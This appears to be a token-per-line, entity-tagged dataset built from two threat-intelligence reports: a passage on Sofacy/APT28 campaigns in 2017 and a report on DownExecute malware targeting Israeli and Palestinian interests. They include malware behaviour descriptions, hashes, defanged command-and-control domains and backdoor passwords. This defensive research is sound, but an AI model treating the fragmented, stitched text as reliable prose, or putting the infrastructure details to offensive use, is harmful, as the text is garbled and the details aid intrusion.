coinciding
with
lighter
interest
in
Central
Asian
targets
,
and
finishing
the
second
half
of
the
year
with
a
heavy
focus
on
Central
Asian
targets
and
some
shift
further
East
.

Dealer's B_malware.backdoor
Choice I

The
beginning
of
2017
began
with
a
slow
cleanup
following
the
Dealer's B_malware.backdoor
Choice I
campaign
,
with
technical
characteristics
documented
by
our
colleagues
at
Palo
Alto
in
several
stages
at
the
end
of
2016
.

The
group
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
carberp B_malware.backdoor
based
JHUHUGIT B_malware.backdoor
downloaders
and
further
stages
of
malware
.

It
seems
that
many
folks
did
not
log
in
and
pull
down
their
emails
until
Jan
2017
to
retrieve
the
Dealer's B_malware.backdoor
Choice I
spearphish I
.

Throughout
these
waves
,
we
observed
that
the
targets
provided
connection
,
even
tangential
,
to
Ukraine
and
NATO
military
and
diplomatic
interests
.

In
multiple
cases
,
Sofacy
spoofs
the
identity
of
a
target
,
and
emails
a
spearphish
to
other
targets
of
interest
.

Often
these
are
military
or
militarytechnology
and
manufacturing
related
,
and
here
,
the
DealersChoice B_malware.backdoor
spearphish I
is
again
NATO
related
:

The
global
reach
that
coincided
with
this
focus
on
NATO
and
the
Ukraine
couldn't
be
overstated
.

Our
KSN
data
showed
spearphishing B_malware.infosteal
targets
geolocated
across
the
globe
into
2017
.

AM
,
AZ
,
FR
,
DE
,
IQ
,
IT
,
KG
,
MA
,
CH
,
UA
,
US
,
VN

DealersChoice B_malware.backdoor
emails I
,
like
the
one
above
,
that
we
were
able
to
recover
from
third
party
sources
provided
additional
targeting
insight
,
and
confirmed
some
of
the
targeting
within
our
KSN
data
:
TR
,
PL
,
BA
,
AZ
,
KR
,
LV
,
GE
,
LV
,
AU
,
SE
,
BE

0day B_malware.unknown
Deployment I
(
s
)

Sofacy
kicked
off
the
year
deploying
two
0day B_malware.unknown
in
a
spearphish
document
,
both
a
Microsoft
Office
encapsulated
postscript
type
confusion
exploit
(
abusing
CVE-2017-0262
)
and
an
escalation
of
privilege
use-after-free
exploit
(
abusing
CVE-2017-0263
)
.

The
group
attempted
to
deploy
this
spearphish
attachment
to
push
a
small
30kb
backdoor
known
as
GAMEFISH B_malware.backdoor
to
targets
in
Europe
at
the
beginning
of
2017
.

They
took
advantage
of
the
Syrian
military
conflict
for
thematic
content
and
file
naming
'
Trump's_Attack_on_Syria_English.docx
'
.

Again
,
this
deployment
was
likely
a
part
of
their
focus
on
NATO
targets
.

Light
SPLM B_malware.backdoor
deployment
in
Central
Asia
and
Consistent
Infrastructure

Meanwhile
in
early-to-mid
2017
,
SPLM B_malware.backdoor
/ I
CHOPSTICK I
/ I
XAgent I
detections
in
Central
Asia
provided
a
glimpse
into
ongoing
focus
on
ex-Soviet
republics
in
Central
Asia
.

These
particular
detections
are
interesting
because
they
indicate
an
attempted
selective
2nd
stage
deployment
of
a
backdoor
maintaining
filestealer
,
keylogger
,
and
remoteshell
functionality
to
a
system
of
interest
.

As
the
latest
revision
of
the
backdoor
,
portions
of
SPLM B_malware.backdoor
didn't
match
previous
reports
on
SPLM B_malware.backdoor
/ I
XAgent I
while
other
similarities
were
maintained
.

SPLM B_malware.backdoor
64-bit
modules
already
appeared
to
be
at
version
4
of
the
software
by
May
of
the
year
.

Targeting
profiles
included
defense
related
commercial
and
military
organizations
,
and
telecommunications
.

Targeting
included
TR
,
KZ
,
AM
,
KG
,
JO
,
UK
,
UZ

Heavy
Zebrocy B_malware.backdoor
deployments

Since
mid-November
2015
,
the
threat
actor
referred
to
as
'
Sofacy
'
or
'
APT28
'
has
been
utilizing
a
unique
payload
and
delivery
mechanism
written
in
Delphi
and
AutoIT
.

We
collectively
refer
to
this
package
and
related
activity
as
'
Zebrocy B_malware.backdoor
'
and
had
written
a
few
reports
on
its
usage
and
development
by
June
2017
–
Sofacy
developers
modified
and
redeployed
incremented
versions
of
the
malware
.

The
Zebrocy B_malware.backdoor
chain
follows
a
pattern
:
spearphish
attachment
->
compiled
Autoit
script
(
downloader
)
-
>
Zebrocy B_malware.backdoor
payload
.

In
some
deployments
,
we
observed
Sofacy
actively
developing
and
deploying
a
new
package
to
a
much
smaller
,
specific
subset
of
targets
within
the
broader
set
.

Targeting
profiles
,
spearphish
filenames
,
and
lures
carry
thematic
content
related
to
visa
applications
and
scanned
images
,
border
control
administration
,
and
various
administrative
notes
.

Targeting
appears
to
be
widely
spread
across
the
Middle
East
,
Europe
,
and
Asia
:
<
/
p
style
=
'
marginbottom
:
0
!
important
'
>

Business
accounting
practices
and
standards

Science
and
engineering
centers

Industrial
and
hydrochemical
engineering
and
standards
/
certification

Ministry
of
foreign
affairs

Embassies
and
consulates

National
security
and
intelligence
agencies

Press
services

Translation
services

NGO
–
family
and
social
service

Ministry
of
energy
and
industry

We
identified
new
MSIL
components
deployed
by
Zebrocy B_malware.backdoor
.

While
recent
Zebrocy B_malware.backdoor
versioning
was
7.1
,
some
of
the
related
Zebrocy B_malware.backdoor
modules
that
drop
file-stealing
MSIL
modules
we
call
Covfacy B_malware.backdoor
were
v7.0
.

The
components
were
an
unexpected
inclusion
in
this
particular
toolset
.

For
example
,
one
sent
out
to
a
handful
of
countries
identifies
network
drives
when
they
are
added
to
target
systems
,
and
then
RC4-like-encrypts
and
writes
certain
file
metadata
and
contents
to
a
local
path
for
later
exfiltration
.

The
stealer
searches
for
files
60mb
and
less
with
these
extensions
:
<
/
p
style
=
'
margin-bottom
:
0
!
important
'
>
.doc
.docx
.xls
.xlsx
.ppt
.pptx
.exe
.zip
.rar

At
execution
,
it
installs
an
application-defined
Windows
hook
.

The
hook
gets
windows
messages
indicating
when
a
network
drive
has
been
attached
.

Upon
adding
a
network
drive
,
the
hook
calls
its
'
RecordToFile
'
file
stealer
method
.

Zebrocy B_malware.backdoor
spearphishing I
targets
:

AF
,
AM
,
AU
,
AZ
,
BD
,
BE
,
CN
,
DE
,
ES
,
FI
,
GE
,
IL
,
IN
,
JO
,
KW
,
KG
,
KZ
,
LB
,
LT
,
MN
,
MY
,
NL
,
OM
,
PK
,
PO
,
SA
,
ZA
,
SK
,
SE
,
CH
,
TJ
,
TM
,
TR
,
UA
,
UAE
,
UK
,
US
,
UZ

SPLM B_malware.backdoor
deployment
in
Central

Asia

SPLM B_malware.backdoor
/ I
CHOPSTICK I
components
deployed
throughout
2017
were
native
64-bit
modular
C++
Windows
COM
backdoors
supporting
http
over
fully
encrypted
TLSv1
and
TLSv1.2
communications
,
mostly
deployed
in
the
second
half
of
2017
by
Sofacy
.

Earlier
SPLM B_malware.backdoor
activity
deployed
32-bit
modules
over
unencrypted
http
(
and
sometimes
smtp
)
sessions
.

In
2016
we
saw
fully
functional
,
very
large
SPLM B_malware.backdoor
/ I
X-Agent I
modules
supporting
OS
X
.

The
executable
module
continues
to
be
part
of
a
framework
supporting
various
internal
and
external
components
communicating
over
internal
and
external
channels
,
maintaining
slightly
morphed
encryption
and
functionality
per
deployment
.

Sofacy
selectively
used
SPLM B_malware.backdoor
/ I
CHOPSTICK I
modules
as
second
stage
implants
to
high
interest
targets
for
years
now
.

In
a
change
from
previous
compilations
,
the
module
was
structured
and
used
to
inject
remote
shell
,
keylogger
,
and
filesystem
add-ons
into
processes
running
on
victim
systems
and
maintaining
functionality
that
was
originally
present
within
the
main
module
.

The
newer
SPLM B_malware.backdoor
modules
are
deployed
mostly
to
Central
Asian
based
targets
that
may
have
a
tie
to
NATO
in
some
form
.

These
targets
include
foreign
affairs
government
organizations
both
localized
and
abroad
,
and
defense
organizations
'
presence
localized
,
located
in
Europe
and
also
located
in
Afghanistan
.

One
outlier
SPLM B_malware.backdoor
target
profile
within
our
visibility
includes
an
audit
and
consulting
firm
in
Bosnia
and
Herzegovina
.

Minor
changes
and
updates
to
the
code
were
released
with
these
deployments
,
including
a
new
mutex
format
and
the
exclusive
use
of
encrypted
HTTP
communications
over
TLS
.

The
compiled
code
itself
already
is
altered
per
deployment
in
multiple
subtle
ways
,
in
order
to
stymie
identification
and
automated
analysis
and
accommodate
targeted
environments
.

Strings
(
c2
domains
and
functionality
,
error
messages
,
etc
)
are
custom
encrypted
per
deployment
.

Targets
:
TR
,
KZ
,
BA
,
TM
,
AF
,
DE
,
LT
,
NL

SPLM B_malware.backdoor
/ I
CHOPSTICK I
/ I
XAgent I
Modularity
and
Infrastructure

This
subset
of
SPLM B_malware.backdoor
/ I
CHOPSTICK I
activity
leads
into
several
small
surprises
that
take
us
into
2018
,
to
be
discussed
in
further
detail
at
SAS
2018
.

The
group
demonstrates
malleability
and
innovation
in
maintaining
and
producing
familiar
SPLM B_malware.backdoor
functionality
,
but
the
pragmatic
and
systematic
approach
towards
producing
undetected
or
difficult-to-detect
malware
continues
.

Changes
in
the
second
stage
SPLM B_malware.backdoor
backdoor  I
are
refined
,
making
the
code
reliably
modular
.

Infrastructure
Notes

Sofacy
set
up
and
maintained
multiple
servers
and
c2
for
varying
durations
,
registering
fairly
recognizable
domains
with
privacy
services
,
registrars
that
accept
bitcoin
,
fake
phone
numbers
,
phony
individual
names
,
and
1
to
1
email
address
to
domain
registration
relationships
.

Some
of
this
activity
and
patterns
were
publicly
disclosed
,
so
we
expect
to
see
more
change
in
their
process
in
2018
.

Also
,
throughout
the
year
and
in
previous
years
,
researchers
began
to
comment
publicly
on
Sofacy's
fairly
consistent
infrastructure
setup
.

As
always
,
attackers
make
mistakes
and
give
away
hints
about
what
providers
and
registrars
they
prefer
.

It's
interesting
to
note
that
this
version
of
SPLM B_malware.backdoor
implements  I
communications
that
are
fully
encrypted
over
HTTPS
.

As
an
example
,
we
might
see
extraneous
data
in
their
SSL
/
TLS
certificates
that
give
away
information
about
their
provider
or
resources
.

Leading
up
to
summer
2017
,
infrastructure
mostly
was
created
with
PDR
and
Internet
Domain
Service
BS
Corp
,
and
their
resellers
.

Hosting
mostly
was
provided
at
Fast
Serv
Inc
and
resellers
,
in
all
likelihood
related
to
bitcoin
payment
processing
.

Accordingly
,
the
server
side
certificates
appear
to
be
generated
locally
on
VPS
hosts
that
exclusively
are
paid
for
at
providers
with
bitcoin
merchant
processing
.

One
certificate
was
generated
locally
on
what
appeared
to
be
a
HP-UX
box
,
and
another
was
generated
on
'
8569985.securefastserver[.]com B_url.distribute
'
with
an
email
address
'
root@8569985.securefastserver[.]com
'
,
as
seen
here
for
their
nethostnet[.]com B_url.distribute
domain
.

This
certificate
configuration
is
ignored
by
the
malware
.

In
addition
to
other
ip
data
,
this
data
point
suggested
that
Qhoster
at
https://www.qhoster[.]com B_url.distribute
was
a
VPS
hosting
reseller
of
choice
at
the
time
.

It
should
be
noted
that
the
reseller
accepted
Alfa
Click
,
PayPal
,

Payza
,
Neteller
,
Skrill
,
WebMoney
,
Perfect
Money
,
Bitcoin
,
Litecoin
,
SolidTrust
Pay
,
CashU
,
Ukash
,
OKPAY
,
EgoPay
,
paysafecard
,
Alipay
,
MG
,
Western
Union
,
SOFORT
Banking
,
QIWI
,
Bank
transfer
for
payment
.

Conclusion

Sofacy
,
one
of
the
most
active
APT
we
monitor
,
continues
to
spearphish
their
way
into
targets
,
reportedly
widely
phishes
for
credentials
,
and
infrequently
participates
in
server
side
activity
(
including
host
compromise
with
BeEF B_malware.backdoor
deployment
,
for
example
)
.

KSN
visibility
and
detections
suggests
a
shift
from
their
early
2017
high
volume
NATO
spearphish
targeting
towards
the
middle
east
and
Central
Asia
,
and
finally
moving
their
focus
further
east
into
late
2017
.

Their
operational
security
is
good
.

Their
campaigns
appear
to
have
broken
out
into
subsets
of
activity
and
malware
involving
GAMEFISH B_malware.backdoor
,
Zebrocy B_malware.backdoor
,
and
SPLM B_malware.backdoor
,
to
name
a
few
.

Their
evolving
and
modified
SPLM B_malware.backdoor
/ I
CHOPSTICK I
/ I
XAgent I
code
is
a
longstanding
part
of
Sofacy
activity
,
however
much
of
it
is
changing
.

We'll
cover
more
recent
2018
change
in
their
targeting
and
the
malware
itself
at
SAS
2018
.

With
a
group
like
Sofacy
,
once
their
attention
is
detected
on
a
network
,
it
is
important
to
review
logins
and
unusual
administrator
access
on
systems
,
thoroughly
scan
and
sandbox
incoming
attachments
,
and
maintain
two
factor
authentication
for
services
like
email
and
vpn
access
.

In
order
to
identify
their
presence
,
not
only
can
you
gain
valuable
insight
into
their
targeting
from
intelligence
reports
and
gain
powerful
means
of
detections
with
hunting
tools
like
YARA
,
but
out-of-band
processing
with
a
solution
like
KATA
is
important
.

Technical
Appendix

Related
md5
8f9f697aa6697acee70336f66f295837 B_hash
1a4b9a6b321da199aa6d10180e889313 B_hash
842454b48f5f800029946b1555fba7fc B_hash
d4a5d44184333442f5015699c2b8af28 B_hash
1421419d1be31f1f9ea60e8ed87277db B_hash
b1d1a2c64474d2f6e7a5db71ccbafa31 B_hash
953c7321c4959655fdd53302550ce02d B_hash
57601d717fcf358220340675f8d63c8a B_hash
02b79c468c38c4312429a499fa4f6c81 B_hash
85cd38f9e2c9397a18013a8921841a04 B_hash
f8e92d8b5488ea76c40601c8f1a08790 B_hash
66b4fb539806ce27be184b6735584339 B_hash
e8e1fcf757fe06be13bead43eaa1338c B_hash
953c7321c4959655fdd53302550ce02d B_hash
aa2aac4606405d61c7e53140d35d7671 B_hash
85cd38f9e2c9397a18013a8921841a04 B_hash
57601d717fcf358220340675f8d63c8a B_hash
16e1ca26bc66e30bfa52f8a08846613d B_hash
f8e92d8b5488ea76c40601c8f1a08790 B_hash
b137c809e3bf11f2f5d867a6f4215f95 B_hash
237e6dcbc6af50ef5f5211818522c463 B_hash
88009adca35560810ec220544e4fb6aa B_hash
2163a33330ae5786d3e984db09b2d9d2 B_hash
02b79c468c38c4312429a499fa4f6c81 B_hash
842454b48f5f800029946b1555fba7fc B_hash
d4a5d44184333442f5015699c2b8af28 B_hash
b88633376fbb144971dcb503f72fd192 B_hash
8f9f697aa6697acee70336f66f295837 B_hash
b6f77273cbde76896a36e32b0c0540e1 B_hash
1a4b9a6b321da199aa6d10180e889313 B_hash
1421419d1be31f1f9ea60e8ed87277db B_hash
1a4b9a6b321da199aa6d10180e889313 B_hash
9b10685b774a783eabfecdb6119a8aa3 B_hash
aa34fb2e5849bff4144a1c98a8158970 B_hash
aced5525ba0d4f44ffd01c4db2730a34 B_hash
b1d1a2c64474d2f6e7a5db71ccbafa31 B_hash
b924ff83d9120d934bb49a7a2e3c4292 B_hash
cdb58c2999eeda58a9d0c70f910d1195 B_hash
d4a5d44184333442f5015699c2b8af28 B_hash
d6f2bf2066e053e58fe8bcd39cb2e9ad B_hash
34dc9a69f33ba93e631cd5048d9f2624 B_hash
1c6f8eba504f2f429abf362626545c79 B_hash
139c9ac0776804714ebe8b8d35a04641 B_hash
e228cd74103dc069663bb87d4f22d7d5 B_hash
bed5bc0a8aae2662ea5d2484f80c1760 B_hash
8c3f5f1fff999bc783062dd50357be79 B_hash
5882a8dd4446abd137c05d2451b85fea B_hash
296c956fe429cedd1b64b78e66797122 B_hash
82f06d7157dd28a75f1fbb47728aea25 B_hash
9a975e0ddd32c0deef1318c485358b20 B_hash
529424eae07677834a770aaa431e6c54 B_hash
4cafde8fa7d9e67194d4edd4f2adb92b B_hash
f6b2ef4daf1b78802548d3e6d4de7ba7 B_hash
ede5d82bb6775a9b1659dccb699fadcb B_hash
116d2fc1665ce7524826a624be0ded1c B_hash
20ff290b8393f006eaf4358f09f13e99 B_hash
4b02dfdfd44df3c88b0ca8c2327843a4 B_hash
c789ec7537e300411d523aef74407a5e B_hash
0b32e65caf653d77cab2a866ee2d9dbc B_hash
27faa10d1bec1a25f66e88645c695016 B_hash
647edddf61954822ddb7ab3341f9a6c5 B_hash
2f04b8eb993ca4a3d98607824a10acfb B_hash
9fe3a0fb3304d749aeed2c3e2e5787eb B_hash
62deab0e5d61d6bf9e0ba83d9e1d7e2b B_hash
86b607fe63c76b3d808f84969cb1a781 B_hash
f62182cf0ab94b3c97b0261547dfc6cf B_hash
504182aaa5575bb38bf584839beb6d51 B_hash
d79a21970cad03e22440ea66bd85931f B_hash

Related
domains
nethostnet[.]com B_url.cncsvr
hostsvcnet[.]com B_url.cncsvr
etcrem[.]net B_url.cncsvr
movieultimate[.]com B_url.cncsvr
newfilmts[.]com B_url.cncsvr
fastdataexchange[.]org B_url.cncsvr
liveweatherview[.]com B_url.cncsvr
analyticsbar[.]org B_url.cncsvr
analyticstest[.]net B_url.cncsvr
lifeofmentalservice[.]com B_url.cncsvr
meteost[.]com B_url.cncsvr
righttopregnantpower[.]com B_url.cncsvr
kiteim[.]org B_url.cncsvr
adobe-flash-updates[.]org B_url.cncsvr
generalsecurityscan[.]com B_url.cncsvr
globalresearching[.]org B_url.cncsvr
lvueton[.]com B_url.cncsvr
audiwheel[.]com B_url.cncsvr
online-reggi[.]com B_url.cncsvr
fsportal[.]net B_url.cncsvr
netcorpscanprotect[.]com B_url.cncsvr
mvband[.]net B_url.cncsvr
mvtband[.]net B_url.cncsvr
viters[.]org B_url.cncsvr
treepastwillingmoment[.]com B_url.cncsvr
sendmevideo[.]org B_url.cncsvr
satellitedeluxpanorama[.]com B_url.cncsvr
ppcodecs[.]com B_url.cncsvr
encoder-info[.]tk B_url.cncsvr
wmdmediacodecs[.]com B_url.cncsvr
postlkwarn[.]com B_url.cncsvr
shcserv[.]com B_url.cncsvr
versiontask[.]com B_url.cncsvr
webcdelivery[.]com B_url.cncsvr
miropc[.]org B_url.cncsvr
securityprotectingcorp[.]com B_url.cncsvr
uniquecorpind[.]com B_url.cncsvr
appexsrv[.]net B_url.cncsvr
adobeupgradeflash[.]com B_url.cncsvr

APT
BACKDOOR
CAMPAIGNS
CYBER
ESPIONAGE

NATION
STATE
SPONSORED
ESPIONAGE
SOFACY

TARGETED
ATTACKS
VULNERABILITIES
AND
EXPLOITS

ZERO-DAY
VULNERABILITIES

Related
Posts

Share
post
on
:




Zero-day
vulnerability
in

Telegram

Gas
is
too
expensive
?

Let's
make
it
cheap
!

Denis
and
Co
.
Attacks
against
Israeli
&
Palestinian
interests
27
April
2015

By
Tom
Lancaster

Follow
@tlansec

Executive
Summary

This
short
report
details
the
techniques
being
used
in
a
series
of
attacks
mostly
against
Israel­based
organisations
.
The
decoy
documents
and
filenames
used
in
the
attacks
suggest
the
intended
targets
include
organisations
with
political
interests
or
influence
in
Israel
and
Palestine
.
Although
we
are
unable
to
link
this
campaign
to
any
already
documented
in
open
source
,
it
bears
similarities
to
some
described
by
others
previously[1],[2]
.

The
earliest
samples
in
the
campaign
we
have
identified
date
back
to
the
summer
of
2014
.
The
number
of
samples
discovered
and
relatively
small
scale
of
infrastructure
suggest
the
attackers
have
limited
resources
with
which
to
conduct
attacks
.

Introduction

Our
investigation
begins
by
taking
a
look
at
the
following
file
:
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9  B_hash
.
According
to
the
analysis
published
on
malwr.com B_url.normal
[3]
,
this
file
was
originally
named
'
Israel
Homeland
Defense
Directory
2015
_Secured_.exe
'
and
,
once
executed
,
the
following
decoy
document
was
presented
:

The
initial
file
in
this
case
is
a
self­extracting
RAR
file
that
contains
three
components
,
including
a
decoy
document
(
in
this
case
,
the
PDF
shown
above
)
and
the
malware
.

Further
inspection
of
the
malware
extracted
showed
it
wasn't
a
family
our
analysts
recognised
.
This
,
coupled
with
the
nature
of
the
decoy
document
used
,
led
us
to
take
a
more
in
depth
look
at
the
malware
,
and
associated
infrastructure
.

We'd
like
to
give
special
thanks
to
Eyal
Sela
of
ClearSky
Security
for
his
collaborative
efforts
in
this
research
.

Delivery

The
most
common
way
this
malware
packaged
is
via
a
self­extracting
RAR
file;
however
the
attackers
also
appear
to
have
used
a
number
of
other
solutions
to
drop
their
malware
,
including
a
Visual
Basic
based
wrapper
and
an
Auto­IT
based
wrapper
.

In
terms
of
how
the
malware
is
delivered
,
it's
most
likely
that
it's
done
via
spearphishing B_malware.backdoor
.

For
example
,
there
are
also
several
occasions
where
the
VirusTotal
'
ITW
'
tab
suggests
that
the
original
dropper
was
available
to
download
on
a
3rd
party
website
.
In
the
case
of
the
sample
discussed
in
the
introduction
we
can
see
:

Pomf.se
is
a
relatively
low­profile
file
sharing/hosting
website
currently
based
in
Sweden
.
The
use
of
low­key
file­sharing
sites
appears
to
be
a
feature
of
the
campaign
as
far
as
we
can
tell
,
with
a
few
other
similar
sites
being
used
in
the
same
way
.

This
,
in
conjunction
with
the
nature
of
the
related
files
we
have
discovered
(
all
of
them
are
directly
executable
files
)
means
it
is
likely
that
the
malware
is
primarily
delivered
via
spear B_malware.unknown
phishing  I
attempts
,
rather
than
any
other
method
.

DownExecute B_malware.infosteal
–
Brief
Analysis

In
this
analysis
,
we'll
go
over
the
file
with
a
SHA256
hash
of
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9  B_hash
.

We've
chosen
to
refer
to
the
malware
as
'
DownExecute B_malware.infosteal
'
due
to
the
.pdb
string
left
in
the
malware
(
leaving
debug
paths
in
malware
seems
to
be
very
fashionable
at
the
moment
...
)
:

All
variants
of
the
DownExecute B_malware.infosteal
'
malware
we've
identified
come
packaged
in
the
following
fashion
:

From
the
samples
we
have
analysed
so
far
,
the
decoy
application
included
is
never
used
by
the
binary
,
and
is
presumably
included
so
that
anyone
taking
a
cursory
look
at
the
file
will
conclude
it
is
in
fact
the
real
deal
.
Whilst
the
cURL[4]
binary
included
is
used
for
internet
connectivity
but
it's
currently
unclear
why
the
attackers
chose
to
use
this
method
of
adding
connectivity
to
their
file
.

Some
of
the
binaries
are
also
self­signed
:

So
what
can
this
malware
do
?
Not
all
that
much
–
it's
just
a
downloader
.

Before
execution
,
the
malware B_malware.infosteal
makes
a
couple
of
checks
to
avoid
analysis
,
including
checking
for
the
presence
of
a
debugger
using
IsDebuggerPresent
as
well
as
checking
for
the
presence
of
VirtualBox
by
looking
for
the
device
name
\\.\VBoxMiniRdrDN
:

The
malware B_malware.infosteal
also
checks
for
the
presence
of
several
anti­virus
solutions
,
as
well
for
any
processes
including
the
word
'
security
'
:

The
malware B_malware.infosteal
then
proceeds
to
decrypt
some
basic
configuration
data
,
including
the
command
&
control
domain
,
and
information
about
the
origin
of
the
infection
,
tracked
via
ID
:

Meanwhile
,
the
malware B_malware.infosteal
begins
calling
home
,
whilst
also
keeping
a
log
of
its
actions
in
a
plaintext
file
that
is
created
in
the
same
folder
as
where
the
binary
was
executed
from
.

After
successful
compromise
...

It
appears
as
though
the
clue
for
the
main
functionality
of
this
malware B_malware.infosteal
is
in
its
name
(
it
downloads
,
and
then
executes
)
files
,
as
it
offers
little
else
for
the
attacker
.
The
DownExecute B_malware.infosteal
malware I
is
used
as
a
way
for
the
attackers
to
gain
an
initial
foothold
on
the
victim
machine
.
The
basic
information
reported
back
by
the
malware
would
also
certainly
allow
the
attacker
a
way
to
triage
infections
to
ensure
they
had
reached
their
intended
victim
rather
than
a
researcher
.

We
don't
have
great
visibility
into
post­compromise
activity
at
this
stage;
however
there
are
a
number
of
other
malware
samples
which
communicate
with
the
same
infrastructure
as
the
DownExecute B_malware.infosteal
samples
.

It's
not
unreasonable
to
infer
that
if
these
are
more
fully
featured
backdoors
,
that
they
are
likely
the
2nd
stage
malware
families
used
in
conjunction
with
DownExecute B_malware.infosteal
.

Specifically
,
we've
observed
the
well­
documented
Xtreme
RAT
and
Poison
Ivy
malware
families
in
use
with
the
same
domain
names
as
DownExecute B_malware.infosteal
.

The
Poison
Ivy
passwords
observed
for
the
group
were
'
admin2014
'
and
'
admin!@#$%
'
.

Command
&
Control
Infrastructure

The
vast
majority
of
infrastructure
in
terms
of
hostnames
observed
associated
with
these
attacks
have
been
dynamic
DNS
domains
,
primarily
associated
with
no­ip.com
.
This
provider
is
popular
with
several

Middle
Eastern
threat
actors
tracked
by
PwC's
intelligence
team
.
In
terms
of
the
size
of
the
infrastructure
used
in
the
campaign
using
the
tools
described
,
it's
also
fairly
small
,
as
shown
on
our
Maltego
graph
.

The
attackers
have
made
an
unusual
choice
with
respect
to
the
hosting
providers
used
for
the
malicious
infrastructure
.
Most
of
the
domains
at
the
time
of
writing
,
and
indeed
historically
,
have
pointed
to
IP
address
space
owned
by
Host
Sailor
,
geo­located
in
Belize
.
Many
of
the
threat
actors
in
the
Middle
East
that
we're
familiar
with
have
extremely
volatile
IP
hosting
,
owing
to
the
fact
that
the
infrastructure
is
likely
to
be
hosted
on
their
own
networks
.
This
remote
hosting
therefore
somewhat
bucks
the
trend
of
some
of
to
be
hosted
on
their
own
networks
.
This
remote
hosting
therefore
somewhat
bucks
the
trend
of
some
of
the
other
actors
we
see
from
the
region
.

Inferred
Targeting

As
we
have
mentioned
in
a
number
of
our
other
reports
[5]
,
attackers
often
use
C&C
domains
which
contain
phrases
relevant
to
their
targets
so
as
to
make
them
appear
legitimate
.
With
this
in
mind
we
performed
some
simple
analysis
on
the
domain
names
used
in
this
campaign
to
identify
legitimate
organisations
being
impersonated
.
For
a
full
list
of
C&Cs
used
,
please
see
Appendix  B_url.cncsvr
B I
.

Domain
name

Legitimate
Entity

Description

Rotter2.sytes.net B_url.cncsvr
rotter.net
Israeli
news
outlet

haartezenglish.strangled.net B_url.cncsvr
haaretz.co.il
Israeli
news
outlet

wallanews.sytes.net B_url.cncsvr
ynet.sytes.net B_url.cncsvr
safar.selfip.com B_url.cncsvr
depka.sytes.net B_url.cncsvr

walla.co.il
ynet.co.il
Safar

Israeli
news
outlet

Israeli
news
outlet

Islamic
2nd
month

debka.com

Israeli
news
outlet

As
shown
,
there
appears
to
be
a
theme
here
,
with
a
number
of
Israeli
news
organisations
being
used
as

C&C
themes
and
hence
probably
being
targeted
.
So
do
we
believe
this
campaign
is
focused
only
at

Israeli
companies
?
Perhaps
not
entirely
.

Targeting

Whilst
there
are
a
number
of
documents
clearly
aimed
at
Israeli
nationals
,
using
political
and
military
themes
,
one
of
the
lures[6]
included
an
Arabic
language
decoy
document
pictured
below
:

The
document
in
question
discusses
an
alleged
leak
of
information
relating
to
Abbas
,
leader
of
the

Palestine
Liberation
Organization
.
Whilst
this
is
a
subject
which
is
clearly
of
key
interest
to
all
parties
in
the
region
,
the
fact
the
attackers
sent
an
Arabic
language
version
of
the
story
may
indicate
that
the
recipient
was
expected
to
be
fluent
in
Arabic
,
and
possibly
therefore
less
likely
to
be
Israeli
,
but
rather
someone
from
another
adjacent
region
.

Conclusion

Whilst
,
in
this
case
,
we're
unable
to
attribute
this
set
of
activity
to
a
specific
group
or
entity
in
the
Middle
East
,
it
does
bear
a
significant
resemblance
to
many
attacks
seen
from
the
Middle
East
that
have
been
previously
documented
.
Specifically
,
the
following
aspects
of
this
campaign
remind
us
of
existing
write­
ups
on
Middle
Eastern
campaigns
:

Consistent
use
of
the
dynamic
DNS
provider
no­ip.com
and
associated
domains
:
it's
unclear
why
there
is
a
preference
for
this
,
however
in
several
'
how­to
'
videos
on
Arabic
language
underground
forums
the
video
creators
recommend
using
no­ip.com
as
opposed
to
other
dynamic

DNS
providers;

Use
of
publically
available
malware
:
many
groups
operating
in
the
Middle
East
use
malware
families
(
such
as
Poison
Ivy/Xtreme
RAT
)
which
are
publically
available
rather
than
developing
their
own
binaries;

Variety
of
targeting
:
the
targeting
seems
entirely
restricted
to
Middle
Eastern
issues
and
,
whilst
there
appears
to
be
a
heavy
focus
on
Israel
in
the
decoy
documents
we've
observed
,
there
is
the
possibility
that
Palestinians
have
been
targeted
as
well
.
This
is
consistent
with
the
complex
relationships
between
the
different
nations
and
political
groups
in
the
region;
Password
schema
:
In
their
August
2013
blog
[7]
,
FireEye
noted
that
a
group
they
refer
to
as

MoleRats
used
Poison
Ivy
and
Xtreme
RAT
,
in
conjunction
with
a
password
of
'
!@#GooD#@
!
'
The
keyboard
walk
used
for
the
symbols
'
!@#
'
across
the
top
of
a
keyboard
is
similar
to
the
password
observed
in
some
of
our
Poison
Ivy
samples
.

The
fact
that
the
attackers
chose
to
develop
their
own
dropper
may
be
indicative
that
their
biggest
problem
when
conducting
network
intrusions
is
getting
their
foot
in
the
door
–
particularly
as
it
seems
as
though
they
still
prefer
the
more
fully
featured
Poison
Ivy
and
Xtreme
RAT
backdoors
as
2nd
stage
malware
families
.

When
we
pivoted
and
looked
for
the
earliest
examples
of
the
DownExecute B_malware.infosteal
malware I
,
the
first
samples
we
could
find
were
compiled
in
June
2014
.
We
have
no
reason
to
believe
in
this
case
that
the
threat
actor
has
tampered
with
the
compile
time
on
any
samples
,
as
all
other
samples
discovered
were
identified
shortly
after
they
were
compiled
.
As
such
we
believe
the
campaign
using
this
downloader
malware
has
been
on­going
for
approximately
12
months
.

Appendix  B_hash
A I
–
Samples

SHA256
8993a516404c0dd62692f3ce5055d4ddee7e29ad4bb6aa29f67114eeeaee26b9  B_hash
bfe727f2f238f11eb989e5b76efd24ad2b41df3cf7dabf7077dfaace834e7f03  B_hash
dad34d2cb2aa9662d4a4148481ae018f5816498f30cc7aee4919e0e9fe6b9e08  B_hash
2cb9df0d52d09c98f0a97ce71eb8805f224945cadab7d615ef0257b7b09c80d3  B_hash
f53fd5389b09c6ad289736720e72392dd5f30a1f7822dbc8c7c2e2b655b4dad9  B_hash
1d533ddaefc7859a3f6c6751114e895b7aa5935eb0ed68b01ec61aa8560ae3d9  B_hash
95b2f926ae173ab45d6dac4039f0b91eb24699e6d11b621bbcebd860752e5d5e  B_hash
da63f6392ce6af83f6d944fa1bd3f28082345fec928647ee7ef9939fac7b2e6c  B_hash
a7aeeead233fcdfe1c7475db982497a82d8ae745ec1c58bd87215e8869c3f9e4  B_hash
2eb7aa306551d693691d14558c5dc4f6d80ef8f69cf466149fbba23953c08f7f  B_hash
e945b055fb4057a396506c74f73b873694125e6178a40d10cabf24b2d89d598f  B_hash
